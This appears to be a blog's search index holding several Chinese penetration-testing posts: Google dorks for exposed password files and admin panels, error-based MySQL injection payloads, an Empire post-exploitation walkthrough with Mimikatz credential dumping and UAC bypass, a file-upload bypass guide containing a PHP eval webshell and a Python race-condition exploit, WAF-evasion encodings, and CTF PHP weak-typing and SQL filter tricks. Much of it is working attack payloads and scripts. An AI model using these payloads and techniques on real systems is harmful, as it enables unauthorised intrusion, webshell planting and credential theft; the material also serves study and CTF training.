<?xml version="1.0" encoding="utf-8"?>
<search>
  
    
    <entry>
      <title><![CDATA[Google Hacking]]></title>
      <url>%2F2017%2F09%2F11%2FGoogle-Hacking%2F</url>
      <content type="text"><![CDATA[列表 inurl:/secure/attachment/ filetype:log OR filetype:txt inurl:share.cgi?ssid= ext:log inurl:”/pgadmin” intitle:”Welcome to QNAP Turbo NAS” “m.zippyshare.com/“ inurl:_vti_pvt/administrators.pwd “– Account dump” ext:sql -git inurl:zabbix.php AND intext:”Zabbix SIA” inurl:front/central.php]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[报错型sql注入原理研究学习]]></title>
      <url>%2F2017%2F09%2F11%2F%E6%8A%A5%E9%94%99%E5%9E%8Bsql%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E7%A0%94%E7%A9%B6%E5%AD%A6%E4%B9%A0%2F</url>
      <content type="text"><![CDATA[前言Mysql在执行语句的时候会抛出异常信息信息，而php+mysql架构的网站往往又将错误代码显示在页面上，这就让一些不法分子有机会从中获取敏感信息 通过floor报错利用方式1?id=1' and (select 1 from (select count(*),concat(floor(rand(0)*2),(select(select(报错语句)) from information_schema.tableslimit 0,1))x from imformation_schema.tables group by x)a)--+ 公式解析12345678910111213floor() 是向下取整数rand() 在0和1之间产生一个随机数rand(0)*2 将取0到2的随机数floor(rand()*2) 有两条记录就会报错floor(rand(0)*2) 记录需要3条以上，且3条以上必报错，返回的值是有规律的count(*)是用来统计结果，相当于刷新一次结果group by 在对数据进行分组时会先看看虚表中有没有这个值，没有的话就插入 存在的话count(*)加1，在使用group by 时floor(rand(0)*2)会被执行一次，若虚表不存在记录，插入虚表会在执行一次 报错过程 rand()用于产生一个0~1的随机数 floor()向下取整 rand()函数生成0~1的整数，向下取整，值是固定的’0’,将rand*2，得到的值就是不固定的，’0’或’1’ concat()将符合条件的同一列中的不同列数据拼接，0x3a是十六进制的”:” 将之前的rand()函数和floor()函数整合起来 查询名字太长，起一个别名 再次查询.information_schema.tables有多少表，会显示多少列 group by 依据我们想要的规矩对结果进行分组 count()统计元组的个数 接着，多重复几次 floor(rand()2)与floor(rand(0)2)的不确定性与确定性floor(rand()*2)不加随机因子的时候是随机出错的，而在3条记录以上用floor(rand(0)*2)就一定报错，由此可猜想floor(rand()*2)是比较随机的，不具备确定性因素，而floor(rand(0)*2)具备某方面的确定性。 通过测试发现，floor(rand()*2)毫无规律可言，而floor(rand(0)*2）是有规律的 那么mysql在遇到`select count（*）from tables group by x`这句话（实际就是建立虚拟表） 1.先建立虚拟表，其中key是主键，不可重复 2.开始查询数据，取数据库数据，然后查看虚拟表存在不，不存在则插入新纪录，存在则count(*)字段直接加，即如果key存在就+1，不存在话就新建一个key 其实mysql官方有给过提示，就是查询的时候如果使用rand()的话，该值会被计算多次，那这个“被计算多次”到底是什么意思，就是在使用group by的时候，floor(rand(0)*2)会被执行一次，如果虚表不存在记录，插入虚表的时候会再被执行一次，我们来看下floor(rand(0)*2)报错的过程就知道了，从0x04可以看到在一次多记录的查询过程中floor(rand(0)*2)的值是定性的，为`011011…`(记住这个顺序很重要)，报错实际上就是floor(rand(0)*2)被计算多次导致的。 完整过程 查询前默认建立空虚拟表 取第一条记录，执行floor(rand(0)2)，发现结果为0(第一次计算),查询虚拟表，发现0的键值不存在，则floor(rand(0)2)会被再计算一次，结果为1(第二次计算)，插入虚表，这是第一条记录 查询第二条记录，再次计算floor(rand(0)2)，发现结果为1（第三次计算）,查询虚表，发现1的键值存在，所以floor(rand(0)2)不会被计算第二次，直接count(*)加1，第二条记录查询完毕 查询第三条记录，再次计算floor(rand(0)2），发现结果为0(第四次计算)，查询虚表，发现键值没有0，则数据库尝试插入一条新的的数据，再插入数据时floor(rand(0)2)被再次计算，作为虚表的主键，其值为1（第5次计算)，然而1这个主键已经存在与虚拟表中，而新计算的值也为1(主键键值必须唯一)，所以插入的时候就直接报错了 整个查询过程floor(rand(0)*2)被计算了5次，查询原数据表3次，所以这就是为什么数据表中需要3条数据，使用该语句才会报错的原因。 updatexmlMySQL5.1.5版本中添加了对XML文档进行查询的修改的函数，分别是updatexml()和extracvalue() 123456789101112mysql&gt; use test;Database changedmysql&gt; create table users -&gt; ( -&gt; id int(3) NOT NULL AUTO_INCREMENT, -&gt; username varchar(20) NOT NULL, -&gt; password varchar(20) NOT NULL,PRIMARY KEY (id) -&gt; );Query OK, 0 rows affected (1.74 sec)mysql&gt; insert into users(id,username,password) values (1,&apos;admin&apos;,&apos;123456&apos;);Query OK, 1 row affected (0.00 sec) 执行报错的payload:1234567mysql&gt; select 1,2,3 and updatexml(1,concat(null,(select @@version),null),1);+---+---+-----------------------------------------------------------+| 1 | 2 | 3 and updatexml(1,concat(null,(select @@version),null),1) |+---+---+-----------------------------------------------------------+| 1 | 2 | NULL |+---+---+-----------------------------------------------------------+1 row in set (0.00 sec) 报错原因： updatexml第二个参数需要的是Xpath格式的字符串，我们输入的格式显然不符合，故故障由此报错 uodatexml的最大长度是32位的，所以有局限（PS：但是应对大多的已经足够。）如果密码长度超过了32位就不会被显示出来。 参考链接]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[域渗透神器Empire安装和简单使用]]></title>
      <url>%2F2017%2F08%2F02%2F%E5%9F%9F%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8Empire%E5%AE%89%E8%A3%85%E5%92%8C%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8%2F</url>
      <content type="text"><![CDATA[1. Empire简介官网介绍如下： 1Empire is a pure PowerShell post-exploitation agent built on cryptologically-secure communications and a flexible architecture. Empire implements the ability to run PowerShell agents without needing powershell.exe, rapidly deployable post-exploitation modules ranging from key loggers to Mimikatz, and adaptable communications to evade network detection, all wrapped up in a usability-focused framework 关于内网渗透，我们平时基本第一时间想到Metasploit，集信息收集，预渗透，渗透，后渗透，木马，社会工程学于一体的平台，但是Empire就是针对内网的渗透，针对powershell，在内网渗透能用到的powershell脚本，全部集成在Empire框架中，其更是域渗透神器。网上关于其介绍的文章寥寥无几，尤其2.0版本，操作和之前的1.6版本等不管是命令啥的都有很大的区别，在网上查了很多外文文献，摸索了半天，在这里做一个笔记，和大家共同进步 Empire安装官网直接转到github下载123456789git clone https://github.com/EmpireProject/Empire.gitcd Empire/cd setup/sudo ./install.sh补充：（清除缓存）cd Empire/cd setup/./reset.sh 运行后的页面如下：我们可以清楚看到有267个模块，0个监听和0个代理 2. 简单的操作演示Empire的listeners就是MSF的监听。就是创建一个监听载荷。Agents相当于MSF的会话sessions。理清这两个基本概念就容易继续搞事情了。 我们的flag是让Rpi打开监听，协议遵循http。然后生成一个dll载荷，生成一个powershell命令。诱骗目标执行。 在命令行里输入listeners进入监听 info 查看需要设置的选项由于篇幅原因，info下的具体信息就不在此罗列，里面的信息还是非常关键的 设置当前监听的名字,并用execute执行 生成载荷 main命令回到主菜单 设置listener，然后执行execute生成dll木马,存在/tmp/launcher.dll中然后将刚刚生成的这么一串字符串放入目标(192.168.1.3)cmd运行。(此时我的HIPS弹出一个拦截，说powershell要联网)就返回一个agent。而那个cmd一闪而过。这就相当于得到一个MSF会话了 选择Jdrops进入会话,进入终端输入help查看可以使用的命令 3. 目标简单探索在这里输入的命令如果不是这里面的命令的话，我们的命令会被解析为windows命令执行，并给回显。但是这里要注意了，每次写完一道命令敲下回车以后，不要感觉是没有回显，要稍等一下才会回显出来 agents 和 back 这两个命令在我们现在的情况来看是差不多的；back 是返回上级，而我们的上级是agents，当写agents的时候，也会回到agents文件 Bypassuac 是提权神级命令，敲完命令就提权，但是由于目标原因可以直接提权成功，我之前在win10测试不能成功 利用mimikatz读取成功hash，Empire有个很方便的地方，就是，我们不需要在mimikatz的回显中去寻找密码，它已经帮我们列举好了，我们只需要执行creds命令，密码就出来了 sc命令 目标截图一张 download目标主机文件 利用upload命令往目标主机上传文件 usemoudle命令，在目标靶机上弹窗 1usemodule trollsploit/message 4. 总结此时，已经0:50，简单总结学习的收获，Empire跟Metasploit一样，有强大的接口，可以方便于我们自己写payload，同时它就是针对powershell的内网渗透工具，虽然没有Metasploit那么强大的各种平台都能应对，但是单单针对windows（这次靶机是我随便开的一台windows7系统），以及域渗透的强大之处估计Metasploit不能比的。关于其具体实战域渗透，在近期会搭建学习，同时为下周培训做准备，就到这吧。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[文件上传漏洞总结]]></title>
      <url>%2F2017%2F07%2F17%2F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%2F</url>
      <content type="text"><![CDATA[1. 概述 文件上传漏洞可以说是日常渗透测试中用得最多的一个漏洞，用它获得服务器权限最快最直接。在Web程序中，经常需要用到文件上传的功能。如用户或者管理员上传图片，或者其它文件。如果没有限制上传类型或者限制不严格被绕过，就有可能造成文件上传漏洞。如果上传了可执行文件或者网页脚本，就会导致网站被控制甚至服务器沦陷。，复杂一点的情况是配合 Web Server的解析漏洞来获取控制权或结合文件包含漏洞。此篇文章主要分三部分：总结一些常见的上传文件校验方式，以及绕过校验的各种姿势，最后对此漏洞提几点防护建议。 2. 上传检测流程 通常一个文件以HTTP协议进行上传时，将以POST请求发送至Web服务器，Web服务器接收到请求并同意后，用户与Web服务器将建立连接，并传输数据。一般文件上传过程中将会经过如下几个检测步骤： 客户端javascript校验（一般只校验文件的扩展名） 服务端校验 文件头content-type字段校验（image/gif） 文件内容头校验（GIF89a） 目录路经检测（检测跟Path参数相关的内容） 文件扩展名检测 (检测跟文件 extension 相关的内容) 后缀名黑名单校验 后缀名白名单校验 自定义正则校验 WAF设备校验（根据不同的WAF产品而定） 3. 客户端校验 这类检测通常在上传页面里含有专门检测文件上传的 javascript 代码 最常见的就是检测扩展名是否合法，有白名单形式也有黑名单形式。 这类检测，通常是在上传页面里含有专门检测文件上传的JavaScript代码，最常见的就是检测扩展名是否合法，示例代码如下： 123456789101112131415161718192021function CheckFileType()&#123; var objButton=document.getElementById("Button1");//上传按钮 var objFileUpload=document.getElementById("FileUpload1"); var objMSG=document.getElementById("msg");//显示提示信息用DIV var FileName=new String(objFileUpload.value);//文件名 var extension=new String(FileName.substring(FileName.lastIndexOf(".")+1,FileName.length));//文件扩展名 if(extension=="jpg"||extension=="JPG")//可以另行添加扩展名 &#123; objButton.disabled=false;//启用上传按钮 objMSG.innerHTML="文件检测通过"; &#125; else &#123; objButton.disabled=true;//禁用上传按钮 objMSG.innerHTML="请选择正确的文件上传"; &#125;&#125; 判断方式：在浏览加载文件，但还未点击上传按钮时便弹出对话框，(进一步确定可以通过配置浏览器HTTP代理（没有流量经过代理就可以证明是客户端JavaScript检测））内容如：只允许传.jpg/.jpeg/.png后缀名的文件，而此时并没有发送数据包。 绕过方法： 将需要上传的恶意代码文件类型改为允许上传的类型，例如将shell.asp改为shell.jpg上传，配置Burp Suite代理进行抓包，然后再将文件名shell.jpg改为shell.asp 上传页面，审查元素，修改JavaScript检测函数（具体方法：可以使用firbug之类的插件把它禁掉） 4. 服务端检测4.1. 服务端MIME类型检测MIME的作用：使客户端软件，区分不同种类的数据，例如web浏览器就是通过MIME类型来判断文件是GIF图片，还是可打印的PostScript文件。web服务器使用MIME来说明发送数据的种类， web客户端使用MIME来说明希望接收到的数据种类。 服务器端检测文件MIME类型可能的代码如下： 123456789101112131415&lt;?phpif($_FILES['file']['type'] != "image/gif")&#123; echo "Sorry, we only allow uploading GIF images"; exit;&#125;$uploaddir = './';$uploadfile = $uploaddir . basename($_FILES['file']['name']);if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile))&#123; echo "File is valid, and was successfully uploaded.\n";&#125; else &#123; echo "File uploading failed.\n";&#125;?&gt; 绕过方法 配置Burp Suite代理进行抓包，将Content-Type修改为image/gif，或者其他允许的类型然后在对应目录生成shell.jpg 4.2. 服务端目录路径检测 上传的数据包中，如果存在path(或者其他名称)等能够操作上传路径的参数，修改该参数配合解析漏洞Get Webshell,测试代码 条件：php版本5.3.4以下；gpc关闭 1234567891011121314151617181920212223242526272829&lt;?phperror_reporting(0);if(isset($_POST['upload']))&#123; $ext_arr = array('flv','swf','mp3','mp4','3gp','zip','rar','gif','jpg','png','bmp'); $file_ext = substr($_FILES['file']['name'],strpos($_FILES['file']['name'],".")+1); if(in_array($file_ext,$file_arr)) &#123; $tempFile = $_FILES['file']['tmp_name']; //这里的$_REQUEST['jieduan']造成可以利用截断上传 $targePath = $_SERVER['DOCUMENT_ROOT'].$_REQUEST['jieduan'].rand(10,99). date('YmdHis').".".$file_ext; if(move_uploaded_file($tempFile,$targePath)) &#123; echo '上传成功'.'&lt;br&gt;'; echo '路径'.$targePath; &#125; else &#123; echo("上传失败"); &#125; &#125;else&#123; echo("上传失败");&#125;&#125;?&gt; 4.3. 服务端文件扩展名检测 黑名单检测：黑名单的安全性比白名单低很多，服务器端，一般会有个专门的blacklist文件，里面会包含常见的危险脚本文件类型，例如：html | htm | php | php2 | hph3 | php4 | php5 | asp | aspx | ascx | jsp | cfm | cfc | bat | exe | com | dll | vbs | js | reg | cgi | htaccess | asis | sh |phtm | shtm |inc等等。 黑名单扩展名过滤，限制不够全面：IIS默认支持解析.asp | .cdx | .asa | .cer等123456789101112131415161718192021222324252627&lt;?phpfunction getExt($filename)&#123; //sunstr - 返回字符串的子串 //strripos — 计算指定字符串在目标字符串中最后一次出现的位置（不区分大小写） return substr($filename,strripos($filename,'.')+1);&#125;if($_FILES["file"]["error"] &gt; 0)&#123; echo "Error: " . $_FILES["file"]["error"] . "&lt;br /&gt;";&#125;else&#123; $black_file = explode("|","php|jsp|asp");//允许上传的文件类型组 $new_upload_file_ext = strtolower(getExt($_FILES["file"]["name"])); //取得被.隔开的最后字符串 if(in_array($new_upload_file_ext,$black_file)) &#123; echo "文件不合法"; die(); &#125; else&#123; $filename = time().".".$new_upload_file_ext; if(move_uploaded_file($_FILES['file']['tmp_name'],"upload/".$filename)) &#123; echo "Upload Success"; &#125; &#125;&#125;?&gt; 不被允许的文件格式.php，但是可以上传文件名为shell.php_(下划线是空格)，IIS支持，linux不支持，详细见下面的特殊文件名绕过描述； 白名单检测仅允许指定的文件类型上传，比如仅与需上传jpg | gif | doc等类型的文件，其他全部禁止 绕过方法： 文件名大小写绕过 用像 AsP，pHp 之类的文件名绕过黑名单检测 名单列表绕过 用黑名单里没有的名单进行攻击，比如黑名单里没有 asa 或 cer 之类 特殊文件名绕过： 比如发送的 http 包里把文件名改成 test.asp. 或 test.asp_(下划线为空格)，这种命名方式 在 windows 系统里是不被允许的，所以需要在 burp 之类里进行修改，然后绕过验证后，会 被 windows 系统自动去掉后面的点和空格，但要注意 Unix/Linux 系统没有这个特性 0x00截断 文件名后缀就一个%00字节，可以截断某些函数对文件名的判断。在许多语言函数中处理函数中，处理字符串中在扩展名检测这大部分都是 asp 的程序有这种漏洞，给个简单的伪代码 1234Name = getname(http requests)//假如这一步获取到的文件名是dama.asp .jpgType = gettype(name)//而在该函数中，是从后往前扫描文件扩展名，所以判断为jpg文件If(type == jpg)SaveFileToPath(UploadPath.name , name)//但在这里却是以0x00作为文件名截断，最后以dama.asp存入路径里 操作方法：上传dama.jpg，Burp抓包，将文件名改为dama.php%00.jpg，选中%00，进行url-decode。 **PHP任意文件上传漏洞（CVE-2015-2348）**该漏洞存在于php的move_uploaded_file()函数中，这个函数一般在上传文件时被使用，用途是将上传的文件移动到新位置。这次的漏洞就出现在$destination这个参数中，这个参数代表的是上传文件移动的最终目的地址。如果$destination变量是从用户$_GET或$_POST中获得的并且我们可控，那么我们可以利用空字符\x00来截断后面的拓展名，从而造成任意文件上传。 演示代码： 1234567891011121314151617181920212223242526272829 &lt;?php/*move_uploaded_file(string $filename,string $destination)$destination参数代表得失上传文件移动的最终目的地址如果$destination变量是从用户$_GET或$_POST中获得的并且我们可控，那么我们可以利用空字符\x00来截断后面的拓展名，从而造成任意文件上传*/if (isset($_POST['Upload']))&#123; $target_path = WEB_PAGE_TO_ROOT."hackable/uploads/"; $target_path = $target_path . basename($_FILES['uploaded']['name']); $uploaded_name = $_FILES['uploaded']['name']; $uploaded_ext = substr($uploaded_name, strrpos($uploaded_name, '.') + 1); $uploaded_size = $_FILES['uploaded']['size']; if (($uploaded_ext == "jpg" || $uploaded_ext == "JPG" || $uploaded_ext == "jpeg" || $uploaded_ext == "JPEG") &amp;&amp; ($uploaded_size &lt; 100000))&#123; if(!move_uploaded_file($_FILES['uploaded']['tmp_name'], $_POST['drops'])) &#123; $html .= '&lt;pre&gt;'; $html .= 'Your image was not uploaded.'; $html .= '&lt;/pre&gt;'; &#125;else &#123; $html .= '&lt;pre&gt;'; $html .= $target_path . ' succesfully uploaded!'; $html .= '&lt;/pre&gt;'; &#125;&#125; else&#123; $html .= '&lt;pre&gt;'; $html .= 'Your image was not uploaded.'; $html .= '&lt;/pre&gt;'; &#125;&#125; 然后我们上传文件，这里把POST的drops参数利用空字符进行截断 .htaccess 文件攻击 配合名单列表绕过，上传一个自定义的.htaccess，就可以轻松绕过各种检测,该文件仅在Apache平台上存在，.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能IIS平台上不存在该文件，该文件默认开启，启用和关闭在httpd.conf文件中配置。该文件的写法如下： 123&lt;FilesMatch "a.jpg"&gt; SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 保存为.htaccess文件。该文件的意思是，只要遇到文件名中包含有”a.jpg”字符串的任意文件，统一执行。如果这个”a.jpg”的内容是一句话木马，即可利用中国菜刀进行连接 4.4. 服务端文件内容检测 文件幻数检测： JPG ： FF D8 FF E0 00 10 4A 46 49 46 GIF ： 47 49 46 38 39 61 (GIF89a) PNG： 89 50 4E 47 绕过方法：在文件幻数后面加上自己的一句话木马就行了。 文件相关信息检测： 一般就是检查图片文件的大小，图片文件的尺寸之类的信息。 绕过方法：伪造好文件幻数，在后面添加一句话木马之后，再添加一些其他的内容，增大文件的大小。 通常，对于文件内容检查的绕过，就是直接用一个结构完整的文件进行恶意代码注入即可。 简化的演示代码： 123&lt;?phpvar_dump(getimagesize("shell.php"));?&gt; 加上GIF头内容 5. 竞争上传演示代码：12345678910111213141516171819202122232425262728&lt;?php$allowtype = array("gif","png","jpg");$size = 10000000;$path = "./";$filename = $_FILES['file']['name'];if(is_uploaded_file($_FILES['file']['tmp_name']))&#123; if(!move_uploaded_file($_FILES['file']['tmp_name'],$path.$filename))&#123; die("error:can not move"); &#125;&#125;else&#123; die("error:not an upload file！");&#125;$newfile = $path.$filename;echo "file upload success.file path is: ".$newfile."\n&lt;br /&gt;";if($_FILES['file']['error']&gt;0)&#123; unlink($newfile); die("Upload file error: ");&#125;$ext = array_pop(explode(".",$_FILES['file']['name']));if(!in_array($ext,$allowtype))&#123; unlink($newfile); die("error:upload the file type is not allowed，delete the file！");&#125;?&gt; 首先将文件上传到服务器，然后检测文件后缀名，如果不符合条件，就删掉，我们的利用思路是这样的，首先上传一个php文件，内容为： 1&lt;?php fputs(fopen("./info.php", "w"), '&lt;?php @eval($_POST["drops"]) ?&gt;'); ?&gt; 当然这个文件会被立马删掉，所以我们使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的php文件，一旦我们成功访问到了上传的文件，那么它就会向服务器写一个shell。利用代码如下： 123456789101112131415161718192021222324252627282930313233343536373839import osimport requestsimport threadingclass RaceCondition(threading.Thread): def __init__(self): threading.Thread.__init__(self) self.url = "http://127.0.0.1:8080/upload/shell0.php" self.uploadUrl = "http://127.0.0.1:8080/upload/copy.php" def _get(self): print('try to call uploaded file...') r = requests.get(self.url) if r.status_code == 200: print("[*]create file info.php success") os._exit(0) def _upload(self): print("upload file.....") file = &#123;"file":open("shell0.php","r")&#125; requests.post(self.uploadUrl, files=file) def run(self): while True: for i in range(5): self._get() for i in range(10): self._upload() self._get()if __name__ == "__main__": threads = 20 for i in range(threads): t = RaceCondition() t.start() for i in range(threads): t.join() 经过几次尝试后成功成功写入shell 6. 图片木马制作命令： 1copy /b 1.jpg+2.php 7. 总结1234567891011121314151617181920212223242526272829303132条件： 寻找一个上传点，查看上传点是否可用。利用：首先判断是程序员自己写的上传点，还是编辑器的上传功能如果是编辑器上传功能，goolge当前编辑器的漏洞如果是程序员写的上传点上传一个正常的jpg图片 查看上传点是否可用上传一个正常的jpg图片，burp拦截，修改后缀为php (可以检测前端验证 MIME检测 文件内容检测 后缀检测）上传一个正常的jpg图片，burp拦截， 00截断 1.php%00.jpg判断服务器是什么类型，web服务器程序，是什么类型，版本号多少利用解析漏洞防御：：：上传文件的存储目录禁用执行权限文件后缀白名单，注意0x00截断攻击（PHP更新到最新版本）不能有本地文件包含漏洞及时修复Web上传代码（重要）升级Web Server 参考链接1. Upload Attack Framework 2. web中的条件竞争漏洞 3. 文件上传总结 4. 截断在文件包含和上传中的利用 5. 文件上传漏洞]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[bypass waf(关键字符替换)]]></title>
      <url>%2F2017%2F04%2F06%2Fbypass-waf-%E5%85%B3%E9%94%AE%E5%AD%97%E7%AC%A6%E6%9B%BF%E6%8D%A2%2F</url>
      <content type="text"><![CDATA[0x01 字母a123456789101112131415%u0000%u0041%u0061%u00aa%u00e2单引号：%u0027%u02b9%u02bc%u02c8%u2032%uff07%c0%27%c0%a7%e0%80%a7 0x02 空白12345%u0020%uff00%c0%20%c0%a0%e0%80%a0 0x03 左括号(12345%u0028%uff08%c0%28%c0%a8%e0%80%a8 0x04 右括号)12345%u0029%uff09%c0%29%c0%a9%e0%80%a9 ###参考链接转载-享受孤独]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[ZCTF线下赛php弱类型]]></title>
      <url>%2F2017%2F04%2F05%2FZCTF%E7%BA%BF%E4%B8%8B%E8%B5%9Bphp%E5%BC%B1%E7%B1%BB%E5%9E%8B%2F</url>
      <content type="text"><![CDATA[0x01源码获取源码泄露，通过源码泄露工具获得一个php文件123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&lt;?phperror_reporting(0);define('FLAG','CTF&#123;THIS_IS_FLAG&#125;');$l01o=0;$o1l0=0;$o10l=0;$lo10=0;if (isset($_GET['vhghf'])) //GET传入一个vhghf&#123; $vhghf = $_GET['vhghf']; $vhghf=="1"?die("ha?"):NULL; //如果vhghf等于1则退出 switch ($vhghf) &#123; case 0: case 1: //如果vhghf等于1则$101o等于1 $l01o=1; echo "1"; break; &#125;&#125;$dfgdf=(array)json_decode(@$_GET['dfgdf']); //GET传入dfgdf且进行json_decode且创建一个数组if(is_array($dfgdf))&#123; //如果为数组则进行接下来的 is_numeric(@$dfgdf["gvnghdjk"])?die("ha?"):NULL; //判断dfgdf中的gvnghdjk是否为数字或数字字符串 if(@$dfgdf["gvnghdjk"])&#123; ($dfgdf["gvnghdjk"]&gt;2017)?$o1l0=1:NULL; //gvnghdjk大于2017 &#125; var_dump($dfgdf["uxcndffznb"]); if(is_array(@$dfgdf["uxcndffznb"]))&#123; //uxcndffznb要为数组 echo "2"; if(count($dfgdf["uxcndffznb"])!==2 OR !is_array($dfgdf["uxcndffznb"][0])) die("ha?"); //数组中有两个值，且第一个还要为数组 $kghdhfghdfgbcvhgffg = array_search("ZCTF", $dfgdf["uxcndffznb"]); //查询uxcndffznb中有没有ZCTF有则返回1没则返回false var_dump($kghdhfghdfgbcvhgffg); $kghdhfghdfgbcvhgffg===false?die("ha?"):NULL; //如果为false则退出 foreach($dfgdf["uxcndffznb"] as $key=&gt;$val)&#123; //查询uxcndffznb中是否有ZCTF如果有则退出 var_dump($val); $val==="ZCTF"?die("ha?"):NULL; echo $val; &#125; $o10l=1; echo "3"."&lt;br&gt;";&#125;&#125;$cdggjydcnfsdyjaq = $_GET['cdggjydcnfsdyjaq']; //MD5碰撞if ($cdggjydcnfsdyjaq != '15562') &#123; if (strstr($cdggjydcnfsdyjaq, '2017ZCTF')) &#123; if (substr(md5($cdggjydcnfsdyjaq),8,16) == substr(md5('15562'),8,16)) &#123; echo "4"."&lt;br&gt;"; $lo10=1; &#125; &#125;&#125;if($l01o &amp;&amp; $o1l0 &amp;&amp; $o10l &amp;&amp; $lo10)&#123; echo "success,flag:".FLAG;&#125;?&gt; getflag前提：要求($l01o &amp;&amp; $o1l0 &amp;&amp; $o10l &amp;&amp; $lo10)都符合要求了就出flag，而具体看就是要求这四个值都为1 0x02分析l01o1将vhghf与1进行比较，而且是双等号，直接1+任意字母绕过 o1l0+o10l12345678910dfgdf["gvnghdjk"]&gt;2017与第一个相似，用大于2017的数值加任意字母绕过array_search是弱类型的比较var_dump(in_array("abc", $array1));&lt;/br&gt;var_dump(in_array("1bc", $array2));它遍历了array的每个值，并且作"=="比较（“当设置了strict 用===”）结果很明显了如果array1里面有个值为0，那么第一条返回就会为真//intval('abc')=0如果array2里面有个值为1，那么第二条就会为真//intval('1bc')=1数字0双等于所有的无数字开头的字符串，可以用0去绕过array_search的比较 lo10123$cdggjydcnfsdyjaq != '15562'(substr(md5($cdggjydcnfsdyjaq),8,16) == substr(md5('15562'),8,16)) 线上赛已经出现过 0x03 测试12payload=?vhghf=1a$&amp;&amp;dfgdf=&#123;"gvnghdjk":"2018aaa","uxcndffznb":[["ZCTF"],0]&#125;&amp;&amp;cdggjydcnfsdyjaq=x2017ZCTF24834]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[CTF Tricks]]></title>
      <url>%2F2017%2F04%2F05%2FCTF-Tricks%2F</url>
      <content type="text"><![CDATA[0x01 php弱类型什么是php弱类型php变量类型12345678910stringintegerarraydoubleobjectresourceNULLstring array NULL 可以从RGPC传入遇到不符类型，自动转换 php类型装换123456789'' == 0 == false'123' == 123'abc' == 0'123a' == 123'0x01' == 1'0e123456789' == '0e987654321'[false] == [0] == [NULL] == ['']NULL == false == 0true == 1 题型1 scrcmp1234567define('FLAG','CTF&#123;THIS_IS_FLAG&#125;');if (strcmp($_GET['flag'],FLAG) == 0)&#123; echo "success,flag:".FLAG;&#125;scrcmp:如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0strcmp比较出错=&gt;返回NULL=&gt;NULL == 0 =&gt; 题型2 字符串比较（原值不相等，md5值相等）123456error_reporting(0);define('FLAG','CTF&#123;THIS_IS_FLAG&#125;');if($_GET['s1'] != $_GET['s2'] &amp;&amp; md5($_GET['s1']) == md5($_GET['s2']))&#123; echo "success,flag:".FLAG;&#125; Solution1 什么是科学计数法 ‘0e123456789’ == ‘0e987654321’ == 0 md5值的取值范围 ‘0123456789abcdef’ [0e+数字]的md5 md5(‘QNKCDZO’) ==‘0e830400451993494058024219903391’ md5(‘240610708’) ==‘0e462097431906509019562988736854’ Solution2 PHP md5函数特性 md5([1,2,3]) == md5([4,5,6]) == NULL 数组Trick,无需再利用弱类型比较特性总结的一些常用的比较1234567891011121314151617php &gt; var_dump(md5('240610708') == md5('QNKCDZO')); bool(true) php &gt; var_dump(md5('240610708'), md5('QNKCDZO')); string(32) "0e462097431906509019562988736854" string(32) "0e830400451993494058024219903391" php &gt; var_dump(md5('240610708') === md5('QNKCDZO')); bool(false) php &gt; var_dump("0e462097431906509019562988736854" == "0e830400451993494058024219903391"); bool(true) php &gt; var_dump("0e462097431906509019562988736854" === "0e830400451993494058024219903391"); bool(false) php &gt; var_dump(md5('240610708') === md5('QNKCDZO')); bool(false) php &gt; var_dump(md5('240610708') == md5('QNKCDZO')); bool(true) php &gt; var_dump(md5('240610708') === md5('QNKCDZO')); bool(false) 题型3 登录逻辑常见考点1234567$name = addcslashes($_POST['name']);$r = $db-&gt;get_row("SELECT `pass` FROM `user` WHERE `name`='&#123;$name&#125;'");if($r['pass'] === md5($_POST['pass']))&#123; //...login success&#125;不存在sql注入漏洞密码比较使用严格模式“===”，故此处不存在弱类型比较漏洞 运行流程: NULL的巧妙构造12345用户不存在=&gt;$r['pass']&lt;=&gt;NULL密码是数组=&gt;md5($_POST['pass']) ⇔ NULL$r['pass'] === md5($_POST['pass'])NULL === NULL 成立成功登录！ 0x02 发现源码（题面信息越少，越可能需要找到源码） 发现套路123题目只给出一个登录框页面只有一两行字页面中包含Powered XXX 关于misc查看通讯地址Trick 直接丢到 https://www.virustotal.com/ 在 Behavioural information 可以看到通讯地址 源码发掘考点一览 0x03 CTF比赛中的那些WAF与绕过题型4 字符串替换WAF123$str = str_replace("select", "", $str);$str = str_replace("union", "", $str);$str = str_replace("into", "", $str); 一大堆非常严格的过滤，最后出现一处字符串替换空型WAF 方法：1test.php?str=-1 uniunionon selselectect 1,2,3,4,5 from `admin` limit 1 题型5 字符替换空型WAF加强版12345$tmp_str = "";while($tmp_str != $str) &#123; $tmp_str = $str; $str = str_replace("select", "", $str);&#125; 通过循环替换转移注意力，实际简单的大小写变换即可绕过1test.php?str=-1 UniON SeLeCT 1,2,3,4,5 FrOM `admin` LiMiT 1 题型6 特殊字符(串)拦截型WAF1234if(preg_match('/(\bselect\b|\bunion\b|and|or|;|,|#|\(|\))/is',$_GET['id'])) &#123; exit('BAD ID');&#125; ####那些常见的SQL Trick1234567891011121314151617[\bselect\b] 或 [\bunion\b]: Mysql条件注释的利用 /*!50000select*/ 浮点数利用WHERE id=0.1UnIoN SeLeCT ...[#] Mysql注释符:/**/,/*!条件注释*、,--,;,`[,] 盲注 mid(user() from 1 for 1) == mid(user(),1,1) UNION注入 union select * from (select 1)a join (select 2)b ==union select 1,2[and] 或 [or]: 查缺补漏xor,||,&amp;&amp;.!,not[&gt;|=|&lt;] 逻辑操作符: 关键字替代符号 between、like、rlike、regex、is 与0比较法 -1 or 